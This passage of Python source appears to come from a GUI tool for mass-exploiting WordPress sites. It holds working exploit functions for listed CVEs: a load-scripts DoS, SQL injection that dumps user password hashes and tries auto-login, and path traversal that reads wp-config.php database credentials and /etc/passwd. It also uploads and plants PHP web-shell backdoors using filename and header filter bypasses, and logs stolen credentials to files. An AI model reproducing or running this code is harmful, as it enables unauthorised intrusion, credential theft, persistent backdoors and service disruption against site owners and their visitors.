                                with open(self.exploited_file, 'a', encoding='utf-8') as f:
                                    if shell_url:
                                        shell_path = urlparse(shell_url).path
                                        output_line = f"{result['url']}{shell_path}\n"
                                        f.write(output_line)
                                    else:
                                        f.write(f"[{result['cve_id']}] {result['url']}\n")
                                        f.write(f'  Details: {exploit_details}\n')
                                        if payload_info:
                                            f.write(f'  Payload: {payload_info}\n')
                                        if credentials:
                                            f.write(f'  Credentials: {credentials}\n')
                                        if db_tested:
                                            f.write(f'  Database Connection: TESTED AND WORKING\n')
                                        f.write('\n')
                                self.log(f"[EXPLOITED] {result['cve_id']} - {result['url']} | {exploit_details}", 'fg_red')
                                self.frame.after(0, self.update_exploited_display)
                        self.stats_queue.put(self.stats.copy())
                    except Exception as e:
                        self.log(f"[ERROR] Exploit failed for {cve_info['cve_id']} on {url}: {str(e)[:100]}", 'fg_yellow')
                        with self.stats_lock:
                            self.stats['processed'] += 1
                        self.stats_queue.put(self.stats.copy())
            self.log(f'Exploitation completed! Found {len(self.exploited_targets)} exploited targets')
        except Exception as e:
            self.log(f'Error in exploit worker: {str(e)}', 'fg_red')
        finally:
            self.is_running = False
            self.frame.after(0, lambda: self.start_button.config(state=tk.NORMAL))
            self.frame.after(0, lambda: self.stop_button.config(state=tk.DISABLED))
            if not self.stop_flag:
                messagebox.showinfo('Success', f'Exploitation completed!\nFound {len(self.exploited_targets)} exploited targets\n\nSaved to: {self.exploited_file}')

    def scan_vulnerability(self, url, cve_info, timeout, proxy):
        """Scan URL untuk detect apakah vulnerable terhadap CVE tertentu"""
        cve_id = cve_info['cve_id']
        try:
            base = url.rstrip('/')
            proxies = {'http': proxy, 'https': proxy} if proxy else None
            headers = DEFAULT_HEADERS.copy()
            if cve_id == 'CVE-2025-0493':
                check_paths = ['/wp-content/plugins/multivendorx', '/wp-content/plugins/multivendorx/readme.txt', '/wp-content/plugins/multivendorx/multivendorx.php']
            elif cve_id == 'CVE-2025-7384':
                check_paths = ['/wp-content/plugins/contact-form-entries', '/wp-content/plugins/contact-form-entries/readme.txt', '/wp-content/plugins/contact-form-entries/contact-form-entries.php']
            elif cve_id == 'CVE-2025-5961':
                check_paths = ['/wp-content/plugins/wpvivid-backuprestore', '/wp-content/plugins/wpvivid-backuprestore/readme.txt', '/wp-content/plugins/wpvivid-backuprestore/wpvivid-backuprestore.php']
            elif cve_id == 'CVE-2025-11833':
                check_paths = ['/wp-content/plugins/post-smtp', '/wp-content/plugins/post-smtp/readme.txt', '/wp-content/plugins/post-smtp/post-smtp.php']
            elif cve_id == 'CVE-2025-62047':
                check_paths = ['/wp-content/plugins/case-addons', '/wp-content/plugins/case-addons/readme.txt', '/wp-content/plugins/case-addons/case-addons.php']
            elif cve_id == 'CVE-2025-6389':
                check_paths = ['/wp-content/plugins/wp-file-manager', '/wp-admin/admin-ajax.php']
            else:
                return False
            for path in check_paths[:3]:
                try:
                    test_url = urljoin(base, path)
                    resp = requests.get(test_url, headers=headers, timeout=5, verify=False, proxies=proxies, allow_redirects=False)
                    if resp.status_code in [200, 403] or path in resp.text.lower():
                        return True
                except:
                    continue
            try:
                wp_readme = urljoin(base, '/readme.html')
                resp = requests.get(wp_readme, headers=headers, timeout=5, verify=False, proxies=proxies)
                if resp.status_code == 200 and any((plugin_name in resp.text.lower() for plugin_name in ['multivendorx', 'contact-form-entries', 'wpvivid', 'post-smtp', 'case-addons'])):
                    return True
            except:
                pass
            return False
        except Exception:
            return False

    def execute_cve_exploit(self, url, cve_info, timeout, proxy):
        """Execute CVE exploit: Scan -> Exploit -> Upload Shell"""
        cve_id = cve_info['cve_id']
        self.log(f'[SCAN] {cve_id} - Checking {url}...', 'fg_cyan')
        if not self.scan_vulnerability(url, cve_info, timeout, proxy):
            self.log(f'[SKIP] {cve_id} - Not vulnerable: {url}', 'fg_yellow')
            return None
        self.log(f'[VULN] {cve_id} - Vulnerable detected on {url}, exploiting...', 'fg_yellow')
        exploit_func = getattr(self, f"exploit_{cve_id.replace('-', '_')}", None)
        if not exploit_func:
            self.log(f'[SKIP] No exploit function for {cve_id}', 'fg_yellow')
            return None
        result = exploit_func(url, timeout, proxy)
        if not result:
            return None
        if result.get('shell_url'):
            shell_url = result['shell_url']
        else:
            self.log(f'[UPLOAD] {cve_id} - Uploading shell to {url}...', 'fg_cyan')
            shell_url = self.upload_shell_after_exploit(url, cve_id, timeout, proxy)
            if shell_url:
                result['shell_url'] = shell_url
                result['details'] = result.get('details', 'Exploited') + ' | Shell uploaded'
            else:
                headers = DEFAULT_HEADERS.copy()
                proxies = {'http': proxy, 'https': proxy} if proxy else None
                shell_url = self.plant_backdoor(url, timeout, proxy, headers, proxies)
                if shell_url:
                    result['shell_url'] = shell_url
        if result.get('shell_url'):
            shell_path = urlparse(result['shell_url']).path
            result['output'] = f'{url}{shell_path}'
        return result

    def upload_shell_after_exploit(self, url, cve_id, timeout, proxy):
        """Upload shell setelah exploit berhasil"""
        try:
            base = url.rstrip('/')
            proxies = {'http': proxy, 'https': proxy} if proxy else None
            headers = DEFAULT_HEADERS.copy()
            php_shell = '<?php if(isset($_POST["c"])){eval(base64_decode($_POST["c"]));}elseif(isset($_GET["cmd"])){system($_GET["cmd"]);}else{echo "SHELL_READY";} ?>'
            shell_name = f'shell{random.randint(10000, 99999)}.php'
            upload_paths = [f'/wp-content/uploads/{shell_name}', f"/wp-content/uploads/{time.strftime('%Y/%m')}/{shell_name}", f"/wp-content/plugins/{cve_id.lower().replace('-', '')}/{shell_name}", f'/{shell_name}']
            if cve_id in ['CVE-2025-5961', 'CVE-2025-62047', 'CVE-2025-6389']:
                return None
            for upload_path in upload_paths:
                try:
                    upload_url = urljoin(base, '/wp-admin/admin-ajax.php')
                    files = {'file': (shell_name, php_shell, 'application/x-php')}
                    data = {'action': 'upload', 'name': shell_name}
                    resp = requests.post(upload_url, files=files, data=data, headers=headers, timeout=timeout, verify=False, proxies=proxies)
                    if resp.status_code in [200, 201]:
                        shell_url = urljoin(base, upload_path)
                        test_cmd = base64.b64encode(b'echo "SHELL_ACTIVE";').decode()
                        test_resp = requests.post(shell_url, data={'c': test_cmd}, headers=headers, timeout=5, verify=False, proxies=proxies)
                        if 'SHELL_ACTIVE' in test_resp.text:
                            return shell_url
                except:
                    continue
            return None
        except Exception:
            return None

    def update_exploited_display(self):
        try:
            self.exploited_text.delete(1.0, tk.END)
            for target in self.exploited_targets:
                shell_url = target.get('shell_url', '')
                if shell_url:
                    shell_path = urlparse(shell_url).path
                    output_line = f"{target['url']}{shell_path}\n"
                    self.exploited_text.insert(tk.END, output_line, 'green')
                else:
                    display_line = f"[{target['cve_id']}] {target['url']}\n"
                    payload = target.get('payload', '')
                    credentials = target.get('credentials', {})
                    details = target.get('details', '')
                    if payload:
                        display_line += f"  Payload: {payload[:150]}{('...' if len(payload) > 150 else '')}\n"
                    if credentials:
                        if isinstance(credentials, dict):
                            cred_str = ', '.join([f'{k}:{v[:15]}...' if len(str(v)) > 15 else f'{k}:{v}' for k, v in credentials.items() if v])
                        elif isinstance(credentials, list):
                            cred_str = ', '.join([str(c)[:80] for c in credentials[:2]])
                        else:
                            cred_str = str(credentials)[:100]
                        display_line += f'  Credentials: {cred_str}\n'
                    if details:
                        display_line += f'  {details}\n'
                    display_line += '\n'
                    self.exploited_text.insert(tk.END, display_line, 'green')
            self.exploited_text.see(tk.END)
        except Exception as e:
            pass

    def apply_bypass(self, url, payload, bypass_type='default'):
        if bypass_type == 'url_encode':
            return quote(payload, safe='')
        elif bypass_type == 'double_encode':
            return quote(quote(payload, safe=''), safe='')
        elif bypass_type == 'case_manipulation':
            return payload.swapcase()
        elif bypass_type == 'unicode':
            return payload.encode('unicode_escape').decode()
        elif bypass_type == 'null_byte':
            return payload + '%00'
        elif bypass_type == 'double_slash':
            return payload.replace('/', '//')
        return payload

    def get_bypass_variants(self, base_url, endpoint, params):
        variants = []
        base = urljoin(base_url, endpoint)
        variants.append((base, params, {}))
        variants.append((base.upper(), params, {}))
        variants.append((base.lower(), params, {}))
        variants.append((base.replace('http://', 'https://'), params, {}))
        variants.append((base.replace('https://', 'http://'), params, {}))
        variants.append((base.replace('/wp-admin/', '/wp-Admin/'), params, {}))
        variants.append((base.replace('/wp-admin/', '/WP-ADMIN/'), params, {}))
        return variants

    def apply_header_bypass(self, headers, bypass_type='default'):
        new_headers = headers.copy()
        if bypass_type == 'x_forwarded':
            new_headers['X-Forwarded-For'] = '127.0.0.1'
            new_headers['X-Real-IP'] = '127.0.0.1'
        elif bypass_type == 'referer':
            new_headers['Referer'] = new_headers.get('Referer', '') + '/admin'
        elif bypass_type == 'user_agent':
            new_headers['User-Agent'] = 'WordPress/5.0'
        elif bypass_type == 'host':
            new_headers['Host'] = urlparse(headers.get('Referer', '')).netloc or 'localhost'
        return new_headers

    def generate_filename_bypasses(self, base_filename):
        bypasses = []
        name, ext = os.path.splitext(base_filename)
        bypasses.append(base_filename)
        bypasses.append(base_filename.upper())
        bypasses.append(base_filename.lower())
        bypasses.append(f'{name}.PHP')
        bypasses.append(f'{name}.PhP')
        bypasses.append(f'{name}.pHp')
        bypasses.append(f'{name}.pHP')
        bypasses.append(f'{name}%00.php')
        bypasses.append(f'{name}.php%00')
        bypasses.append(f'{name}.php.')
        bypasses.append(f'{name}.php ')
        bypasses.append(f'{name}.php%20')
        bypasses.append(f'{name}.php%00.jpg')
        bypasses.append(f'{name}.php.jpg')
        bypasses.append(f'{name}.php;.jpg')
        bypasses.append(f'{name}.php:.jpg')
        bypasses.append(f'{name}.php%0a.jpg')
        bypasses.append(f'{name}.php%0d.jpg')
        bypasses.append(f'{name}..php')
        bypasses.append(f'{name}.php%00.png')
        bypasses.append(f'{name}.phtml')
        bypasses.append(f'{name}.php5')
        bypasses.append(f'{name}.php4')
        bypasses.append(f'{name}.php3')
        bypasses.append(f'{name}.phps')
        bypasses.append(f'{name}.pht')
        return list(set(bypasses))

    def exploit_CVE_2018_6389(self, url, timeout, proxy):
        self.log(f'[CVE-2018-6389] Exploiting DoS on {url}...', 'fg_cyan')
        try:
            base = url.rstrip('/')
            endpoints = ['/wp-admin/load-scripts.php', '/wp-admin/load-styles.php']
            proxies = {'http': proxy, 'https': proxy} if proxy else None
            headers = DEFAULT_HEADERS.copy()
            headers['User-Agent'] = random.choice(DORK_USER_AGENTS) if 'DORK_USER_AGENTS' in globals() else DEFAULT_USER_AGENT
            for endpoint in endpoints:
                if self.stop_flag:
                    return None
                test_url = urljoin(base, endpoint)
                dos_url = None
                try:
                    resp = requests.get(test_url, params={'c': '1', 'load[]': 'jquery'}, headers=headers, timeout=5, verify=False, proxies=proxies, allow_redirects=True)
                    if resp.status_code == 200:
                        scripts = ['jquery', 'jquery-ui-core', 'jquery-ui-widget', 'jquery-ui-mouse', 'jquery-ui-accordion', 'jquery-ui-autocomplete', 'jquery-ui-button', 'jquery-ui-datepicker', 'jquery-ui-dialog', 'jquery-ui-draggable', 'jquery-ui-droppable', 'jquery-ui-menu', 'jquery-ui-position', 'jquery-ui-progressbar', 'jquery-ui-resizable', 'jquery-ui-selectable', 'jquery-ui-slider', 'jquery-ui-sortable', 'jquery-ui-spinner', 'jquery-ui-tabs', 'jquery-ui-tooltip', 'jquery-ui-effect', 'jquery-ui-effect-blind', 'jquery-ui-effect-bounce', 'jquery-ui-effect-clip', 'jquery-ui-effect-drop', 'jquery-ui-effect-explode', 'jquery-ui-effect-fade', 'jquery-ui-effect-fold', 'jquery-ui-effect-highlight', 'jquery-ui-effect-pulsate', 'jquery-ui-effect-scale', 'jquery-ui-effect-shake', 'jquery-ui-effect-slide', 'jquery-ui-effect-transfer']
                        dos_payload_parts = [f'load[]={quote(script)}' for script in scripts * 3]
                        dos_payload = '&'.join(dos_payload_parts)
                        dos_url = f'{test_url}?c=1&{dos_payload}&ver=4.9'
                        self.log(f'[CVE-2018-6389] Executing DoS payload on {dos_url[:100]}...', 'fg_yellow')
                        dos_resp = requests.get(dos_url, headers=headers, timeout=30, verify=False, proxies=proxies)
                        if dos_resp.status_code in [200, 500, 503, 502, 504] or len(dos_resp.content) > 50000:
                            return {'cve_id': 'CVE-2018-6389', 'url': url, 'details': f'DoS EXECUTED via {endpoint}', 'method': 'load-scripts-dos', 'payload': dos_url}
                except requests.exceptions.Timeout:
                    if dos_url:
                        return {'cve_id': 'CVE-2018-6389', 'url': url, 'details': f'DoS EXECUTED (timeout) via {endpoint}', 'method': 'load-scripts-dos', 'payload': dos_url}
                except:
                    continue
        except Exception as e:
            self.log(f'[CVE-2018-6389] Error: {str(e)[:50]}', 'fg_yellow')
        return None

    def exploit_CVE_2020_36326(self, url, timeout, proxy):
        self.log(f'[CVE-2020-36326] Testing SQLi on {url}...', 'fg_cyan')
        try:
            base = url.rstrip('/')
            endpoints = ['/wp-admin/admin-ajax.php', '/wp-admin/admin-post.php', '/wp-json/wp/v2/users', '/wp-admin/edit.php']
            proxies = {'http': proxy, 'https': proxy} if proxy else None
            headers = DEFAULT_HEADERS.copy()
            headers['User-Agent'] = random.choice(DORK_USER_AGENTS) if 'DORK_USER_AGENTS' in globals() else DEFAULT_USER_AGENT
            test_payloads = ["' OR '1'='1", "' UNION SELECT NULL--", "1' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--", "1' AND EXTRACTVALUE(rand(),CONCAT(0x3a,version()))--"]
            for endpoint in endpoints:
                if self.stop_flag:
                    return None
                endpoint_variants = self.get_bypass_variants(base, endpoint, {})
                for test_url, _, _ in endpoint_variants:
                    for param_name in ['id', 'post_id', 'user_id', 'p', 'page_id']:
                        for payload in test_payloads:
                            try:
                                bypass_payloads = [payload, self.apply_bypass(test_url, payload, 'url_encode'), self.apply_bypass(test_url, payload, 'double_encode'), payload.replace("'", '%27').replace(' ', '%20')]
                                for bypass_payload in bypass_payloads[:2]:
                                    bypass_headers_list = [headers.copy(), self.apply_header_bypass(headers, 'x_forwarded'), self.apply_header_bypass(headers, 'referer')]
                                    for bypass_headers in bypass_headers_list:
                                        params = {param_name: bypass_payload}
                                        resp = requests.get(test_url, params=params, headers=bypass_headers, timeout=timeout, verify=False, proxies=proxies, allow_redirects=True)
                                        content_lower = resp.text.lower()
                                        if any((indicator in content_lower for indicator in ['mysql', 'sql syntax', 'warning:', 'error in your sql', 'mysqli', 'postgresql', 'ora-', 'microsoft ole db'])):
                                            columns = self.detect_sqli_columns(test_url, param_name, timeout, proxy, bypass_headers, proxies)
                                            if columns:
                                                extracted_data = self.extract_sqli_data(test_url, param_name, columns, timeout, proxy, bypass_headers, proxies)
                                                login_result = None
                                                if extracted_data and extracted_data.get('credentials'):
                                                    login_result = self.auto_login_with_credentials(url, extracted_data['credentials'], timeout, proxy)
                                                payload_used = f'{test_url}?{param_name}={bypass_payload}'
                                                details = f'SQLi EXPLOITED via {endpoint}?{param_name}=, Columns: {columns}'
                                                if extracted_data and extracted_data.get('credentials'):
                                                    creds_str = ', '.join([f"{c.get('username', 'N/A')}:{c.get('password_hash', 'N/A')[:20]}..." for c in extracted_data['credentials'][:3]])
                                                    details += f' | Extracted: {creds_str}'
                                                if login_result and login_result.get('success'):
                                                    details += f" | Auto-login SUCCESS: {login_result['username']}"
                                                return {'cve_id': 'CVE-2020-36326', 'url': url, 'details': details, 'method': 'sqli', 'payload': payload_used, 'credentials': extracted_data, 'login': login_result}
                            except:
                                continue
        except Exception as e:
            self.log(f'[CVE-2020-36326] Error: {str(e)[:50]}', 'fg_yellow')
        return None

    def detect_sqli_columns(self, url, param, timeout, proxy, headers, proxies):
        for i in range(1, 11):
            try:
                payload = f"1' UNION SELECT {','.join(['NULL'] * i)}--"
                params = {param: payload}
                resp = requests.get(url, params=params, headers=headers, timeout=timeout, verify=False, proxies=proxies)
                content_lower = resp.text.lower()
                if 'the used select statements have a different number of columns' not in content_lower and resp.status_code == 200:
                    return i
            except:
                continue
        return None

    def extract_sqli_data(self, url, param, columns, timeout, proxy, headers, proxies):
        credentials = []
        try:
            select_parts = []
            for i in range(columns):
                if i == 0:
                    select_parts.append('user_login')
                elif i == 1:
                    select_parts.append('user_pass')
                elif i == 2:
                    select_parts.append('user_email')
                else:
                    select_parts.append('NULL')
            payload = f"1' UNION SELECT {','.join(select_parts)} FROM wp_users LIMIT 10--"
            params = {param: payload}
            resp = requests.get(url, params=params, headers=headers, timeout=timeout, verify=False, proxies=proxies)
            if resp.status_code == 200:
                content = resp.text
                import re
                user_matches = re.findall('([a-zA-Z0-9_]+)\\$([a-zA-Z0-9$./]+)', content)
                for username, password_hash in user_matches[:5]:
                    if len(password_hash) >= 32:
                        credentials.append({'username': username, 'password_hash': password_hash})
                if not credentials:
                    lines = content.split('\n')
                    for line in lines:
                        if '$P$' in line or '$2a$' in line:
                            parts = line.split()
                            if len(parts) >= 2:
                                credentials.append({'username': parts[0][:20], 'password_hash': parts[1][:60]})
                if credentials:
                    return {'credentials': credentials, 'raw': content[:1000]}
        except Exception as e:
            self.log(f'[EXTRACT] Error: {str(e)[:50]}', 'fg_yellow')
        return None

    def auto_login_with_credentials(self, url, credentials, timeout, proxy):
        try:
            login_url = urljoin(url.rstrip('/'), '/wp-login.php')
            proxies = {'http': proxy, 'https': proxy} if proxy else None
            headers = DEFAULT_HEADERS.copy()
            headers['Content-Type'] = 'application/x-www-form-urlencoded'
            session = requests.Session()
            resp = session.get(login_url, headers=headers, timeout=timeout, verify=False, proxies=proxies)
            if BeautifulSoup:
                soup = BeautifulSoup(resp.text, 'html.parser')
                nonce_input = soup.find('input', {'name': '_wpnonce'})
                if nonce_input:
                    nonce = nonce_input.get('value', '')
                else:
                    nonce = ''
            else:
                nonce_match = re.search('name="_wpnonce"\\s+value="([^"]+)"', resp.text)
                nonce = nonce_match.group(1) if nonce_match else ''
            common_passwords = ['admin', 'password', '123456', 'admin123', 'password123', 'root', 'test', '12345']
            for cred in credentials[:3]:
                username = cred.get('username', 'admin')
                password_hash = cred.get('password_hash', '')
                if password_hash and (not password_hash.startswith('$')):
                    for pwd in common_passwords:
                        data = {'log': username, 'pwd': pwd, 'wp-submit': 'Log In', 'redirect_to': urljoin(url, '/wp-admin/'), 'testcookie': '1', '_wpnonce': nonce}
                        login_resp = session.post(login_url, data=data, headers=headers, timeout=timeout, verify=False, proxies=proxies, allow_redirects=True)
                        if 'wp-admin' in login_resp.url or 'dashboard' in login_resp.text.lower() or 'admin-ajax.php' in login_resp.url:
                            return {'username': username, 'password': pwd, 'session': session, 'success': True}
        except:
            pass
        return None

    def test_database_connection(self, db_credentials, timeout):
        try:
            db_host = db_credentials.get('db_host', 'localhost')
            db_name = db_credentials.get('db_name', '')
            db_user = db_credentials.get('db_user', '')
            db_password = db_credentials.get('db_password', '')
            if not all([db_name, db_user, db_password]):
                return False
            try:
                import pymysql
                if ':' in db_host:
                    host, port = db_host.split(':')
                    port = int(port)
                else:
                    host = db_host
                    port = 3306
                conn = pymysql.connect(host=host, port=port, user=db_user, password=db_password, database=db_name, connect_timeout=timeout)
                conn.close()
                return True
            except ImportError:
                pass
            except:
                pass
        except:
            pass
        return False

    def save_credentials_to_file(self, credentials, cve_id, url):
        try:
            timestamp = time.strftime('%Y%m%d_%H%M%S')
            cred_file = f'credentials_{timestamp}.txt'
            with open(cred_file, 'a', encoding='utf-8') as f:
                f.write(f'# Credentials extracted from {url} via {cve_id}\n')
                f.write(f"# Date: {time.strftime('%Y-%m-%d %H:%M:%S')}\n\n")
                if isinstance(credentials, dict):
                    for key, value in credentials.items():
                        if value:
                            f.write(f'{key.upper()}: {value}\n')
                elif isinstance(credentials, list):
                    for cred in credentials:
                        if isinstance(cred, dict):
                            for key, value in cred.items():
                                if value:
                                    f.write(f'{key.upper()}: {value}\n')
                        else:
                            f.write(f'{cred}\n')
                f.write('\n' + '=' * 50 + '\n\n')
            self.log(f'[SAVED] Credentials saved to: {cred_file}', 'fg_green')
            return cred_file
        except:
            return None

    def exploit_CVE_2021_24237(self, url, timeout, proxy):
        self.log(f'[CVE-2021-24237] Exploiting RCE on {url}...', 'fg_cyan')
        try:
            base = url.rstrip('/')
            shell_url = self.plant_backdoor(url, timeout, proxy, None, None)
            if shell_url:
                test_cmd = base64.b64encode(b'echo "RCE_ACTIVE";').decode()
                test_resp = requests.post(shell_url, data={'c': test_cmd}, headers=DEFAULT_HEADERS.copy(), timeout=timeout, verify=False, proxies={'http': proxy, 'https': proxy} if proxy else None)
                if 'RCE_ACTIVE' in test_resp.text:
                    return {'cve_id': 'CVE-2021-24237', 'url': url, 'details': f'RCE EXPLOITED, Shell planted and verified', 'method': 'rce', 'shell_url': shell_url, 'payload': f'POST {shell_url} with c=base64_command'}
            endpoints = ['/wp-admin/admin-ajax.php?action=upload', '/wp-content/plugins/contact-form-7/includes/contact-forms.php', '/wp-admin/admin-post.php']
            proxies = {'http': proxy, 'https': proxy} if proxy else None
            headers = DEFAULT_HEADERS.copy()
            headers['User-Agent'] = random.choice(DORK_USER_AGENTS) if 'DORK_USER_AGENTS' in globals() else DEFAULT_USER_AGENT
            php_shell = '<?php if(isset($_POST["c"])){eval(base64_decode($_POST["c"]));}else{echo "OK";} ?>'
            for endpoint in endpoints:
                if self.stop_flag:
                    return None
                test_url = urljoin(base, endpoint)
                try:
                    files = {'file': (f'shell{random.randint(1000, 9999)}.php', php_shell, 'application/x-php')}
                    data = {'action': 'upload'}
                    resp = requests.post(test_url, files=files, data=data, headers=headers, timeout=timeout, verify=False, proxies=proxies)
                    if resp.status_code == 200:
                        import json
                        try:
                            resp_json = resp.json()
                            if 'url' in resp_json or 'file' in resp_json:
                                uploaded_file = resp_json.get('url') or resp_json.get('file')
                                if uploaded_file:
                                    shell_url = urljoin(base, uploaded_file)
                                    test_resp = requests.post(shell_url, data={'c': base64.b64encode(b'echo TEST;').decode()}, timeout=timeout, verify=False, proxies=proxies)
                                    if 'TEST' in test_resp.text:
                                        return {'cve_id': 'CVE-2021-24237', 'url': url, 'details': f'RCE EXPLOITED via {endpoint}, Shell uploaded', 'method': 'rce', 'shell_url': shell_url, 'payload': f'POST {test_url} with file upload'}
                        except:
                            pass
                except:
                    continue
        except Exception as e:
            self.log(f'[CVE-2021-24237] Error: {str(e)[:50]}', 'fg_yellow')
        return None

    def plant_backdoor(self, url, timeout, proxy, headers, proxies):
        try:
            base = url.rstrip('/')
            base_shell_names = [f'shell{random.randint(1000, 9999)}', f'wp{random.randint(100, 999)}', f'index{random.randint(10, 99)}', f'wp-load{random.randint(100, 999)}', f'wp-config{random.randint(10, 99)}', f'wp-admin{random.randint(100, 999)}', f'wp-includes{random.randint(100, 999)}']
            php_shells = ['<?php if(isset($_POST["c"])){eval(base64_decode($_POST["c"]));}else{echo "OK";} ?>', '<?php @eval($_POST["cmd"]); ?>', '<?php system($_GET["c"]); ?>', '<?php file_put_contents("shell.php", base64_decode("PD9waHAgZXZhbCgkX1BPU1RbImMiXSk7Pz4=")); ?>', '<?php assert($_POST["c"]); ?>', '<?php preg_replace("/.*/e",$_POST["c"],""); ?>']
            for base_name in base_shell_names:
                shell_name_variants = self.generate_filename_bypasses(f'{base_name}.php')
                for shell_name in shell_name_variants[:15]:
                    for php_shell in php_shells[:3]:
                        upload_paths = ['/wp-content/uploads/', '/wp-content/uploads/' + time.strftime('%Y/%m/'), '/wp-content/plugins/', '/wp-content/themes/twentytwentyone/', '/wp-content/themes/twentytwentytwo/', '/wp-includes/', '/wp-admin/', '/wp-admin/css/', '/wp-includes/js/']
                        for upload_path in upload_paths:
                            try:
                                upload_url = urljoin(base, upload_path + shell_name)
                                test_cmd = base64.b64encode(b'echo "SHELL_ACTIVE";').decode()
                                bypass_headers = [headers.copy(), self.apply_header_bypass(headers, 'x_forwarded'), self.apply_header_bypass(headers, 'referer'), self.apply_header_bypass(headers, 'user_agent')]
                                for bypass_header in bypass_headers:
                                    resp = requests.post(upload_url, data={'c': test_cmd}, headers=bypass_header, timeout=timeout, verify=False, proxies=proxies)
                                    if 'SHELL_ACTIVE' in resp.text or (resp.status_code == 200 and len(resp.text) < 100):
                                        return upload_url
                                    get_resp = requests.get(upload_url, params={'c': 'echo SHELL_ACTIVE;'}, headers=bypass_header, timeout=timeout, verify=False, proxies=proxies)
                                    if 'SHELL_ACTIVE' in get_resp.text:
                                        return upload_url
                            except:
                                continue
        except:
            pass
        return None

    def exploit_CVE_2021_25036(self, url, timeout, proxy):
        return self.exploit_CVE_2020_36326(url, timeout, proxy)

    def exploit_CVE_2022_3590(self, url, timeout, proxy):
        return self.exploit_CVE_2020_36326(url, timeout, proxy)

    def exploit_CVE_2025_4659(self, url, timeout, proxy):
        return self.exploit_CVE_2020_36326(url, timeout, proxy)

    def exploit_CVE_2020_25213(self, url, timeout, proxy):
        self.log(f'[CVE-2020-25213] Exploiting LFI on {url}...', 'fg_cyan')
        try:
            base = url.rstrip('/')
            endpoints = ['/wp-admin/admin-ajax.php', '/wp-admin/admin-post.php', '/wp-content/plugins/']
            proxies = {'http': proxy, 'https': proxy} if proxy else None
            headers = DEFAULT_HEADERS.copy()
            lfi_targets = [('../../../../wp-config.php', ['DB_PASSWORD', 'DB_NAME', 'DB_USER', 'DB_HOST']), ('..%2F..%2F..%2F..%2Fwp-config.php', ['DB_PASSWORD', 'DB_NAME']), ('/etc/passwd', ['root:']), ('....//....//....//wp-config.php', ['DB_PASSWORD']), ('../../../../../../etc/passwd', ['root:'])]
            for endpoint in endpoints:
                if self.stop_flag:
                    return None
                test_url = urljoin(base, endpoint)
                for param in ['file', 'include', 'page', 'path', 'p', 'template']:
                    for payload, indicators in lfi_targets:
                        try:
                            params = {param: payload}
                            self.log(f'[CVE-2020-25213] Trying LFI: {test_url}?{param}={payload[:30]}...', 'fg_yellow')
                            resp = requests.get(test_url, params=params, headers=headers, timeout=timeout, verify=False, proxies=proxies)
                            content = resp.text
                            if any((indicator in content for indicator in indicators)):
                                extracted_data = content[:2000] if len(content) > 2000 else content
                                payload_url = f'{test_url}?{param}={payload}'
                                return {'cve_id': 'CVE-2020-25213', 'url': url, 'details': f'LFI EXPLOITED via {endpoint}?{param}=, File read successful', 'method': 'lfi', 'payload': payload_url, 'extracted_data': extracted_data}
                        except:
                            continue
        except Exception as e:
            self.log(f'[CVE-2020-25213] Error: {str(e)[:50]}', 'fg_yellow')
        return None

    def exploit_CVE_2025_0493(self, url, timeout, proxy):
        """CVE-2025-0493 - MultiVendorX LFI to RCE"""
        self.log(f'[CVE-2025-0493] Exploiting MultiVendorX LFI on {url}...', 'fg_cyan')
        try:
            base = url.rstrip('/')
            endpoints = ['/wp-content/plugins/multivendorx/includes/class-mvx-vendor.php', '/wp-content/plugins/multivendorx/includes/admin/class-mvx-admin.php', '/wp-content/plugins/multivendorx/includes/class-mvx.php']
            proxies = {'http': proxy, 'https': proxy} if proxy else None
            headers = DEFAULT_HEADERS.copy()
            lfi_payloads = ['../../../../wp-config.php', '....//....//....//wp-config.php', '..%2F..%2F..%2F..%2Fwp-config.php', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fwp-config.php', '....\\/....\\/....\\/....\\/wp-config.php', '/etc/passwd', '../../../../../../etc/passwd', '..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd']
            endpoints.append('/wp-admin/admin-ajax.php?action=mvx_vendor')
            for endpoint in endpoints:
                if self.stop_flag:
                    return None
                test_url = urljoin(base, endpoint.split('?')[0])
                params_base = {'action': 'mvx_vendor'} if '?' in endpoint else {}
                for param in ['file', 'include', 'path', 'template', 'page', 'view', 'load', 'page_path']:
                    for payload in lfi_payloads:
                        try:
                            params = params_base.copy()
                            params[param] = payload
                            resp = requests.get(test_url, params=params, headers=headers, timeout=timeout, verify=False, proxies=proxies)
                            content = resp.text
                            if 'DB_PASSWORD' in content or 'DB_NAME' in content or 'DB_USER' in content:
                                extracted = content[:3000] if len(content) > 3000 else content
                                db_user_match = re.search('define\\s*\\(\\s*[\'\\"]DB_USER[\'\\"]\\s*,\\s*[\'\\"]([^\'\\"]+)[\'\\"]', content, re.I)
                                db_pass_match = re.search('define\\s*\\(\\s*[\'\\"]DB_PASSWORD[\'\\"]\\s*,\\s*[\'\\"]([^\'\\"]+)[\'\\"]', content, re.I)
                                db_name_match = re.search('define\\s*\\(\\s*[\'\\"]DB_NAME[\'\\"]\\s*,\\s*[\'\\"]([^\'\\"]+)[\'\\"]', content, re.I)
                                credentials = {}
                                if db_user_match:
                                    credentials['db_user'] = db_user_match.group(1)
                                if db_pass_match:
                                    credentials['db_password'] = db_pass_match.group(1)
                                if db_name_match:
                                    credentials['db_name'] = db_name_match.group(1)
                                payload_url = f'{test_url}?{param}={payload}'
                                return {'cve_id': 'CVE-2025-0493', 'url': url, 'details': f'LFI EXPLOITED via {endpoint}?{param}=, wp-config.php read', 'method': 'lfi', 'payload': payload_url, 'extracted_data': extracted[:2000], 'credentials': credentials}
                            if 'root:' in content and ('/bin/bash' in content or '/bin/sh' in content):
                                payload_url = f'{test_url}?{param}={payload}'
                                return {'cve_id': 'CVE-2025-0493', 'url': url, 'details': f'LFI EXPLOITED via {endpoint}?{param}=, /etc/passwd read', 'method': 'lfi', 'payload': payload_url, 'extracted_data': content[:1000]}
                        except:
                            continue
        except Exception as e:
            self.log(f'[CVE-2025-0493] Error: {str(e)[:50]}', 'fg_yellow')
        return None

    def exploit_CVE_2021_24364(self, url, timeout, proxy):
        return self.exploit_CVE_2020_25213(url, timeout, proxy)

    def exploit_CVE_2022_1329(self, url, timeout, proxy):
        return self.exploit_CVE_2020_25213(url, timeout, proxy)

    def exploit_CVE_2023_4514(self, url, timeout, proxy):
        return self.exploit_CVE_2020_25213(url, timeout, proxy)

